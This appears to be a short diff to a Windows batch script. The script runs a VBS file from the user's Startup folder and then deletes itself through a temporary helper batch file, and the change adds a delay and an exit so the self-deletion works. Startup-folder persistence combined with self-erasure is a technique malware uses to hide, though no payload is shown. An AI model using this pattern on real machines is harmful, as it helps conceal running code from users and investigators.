@@ -10,8 +10,12 @@ wscript "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"
 
 REM Create a new batch file to delete the original batch file
 echo @echo off > "%TEMP%\delete_self.bat"
+echo timeout /t 1 /nobreak >nul >> "%TEMP%\delete_self.bat"
 echo del "%~f0" >> "%TEMP%\delete_self.bat"
 echo del "%TEMP%\delete_self.bat" >> "%TEMP%\delete_self.bat"
 
 REM Schedule the new batch file to run after the current script finishes
-start "" "%TEMP%\delete_self.bat"
+start "" cmd /c "%TEMP%\delete_self.bat"
+
+REM Close the current CMD window
+exit
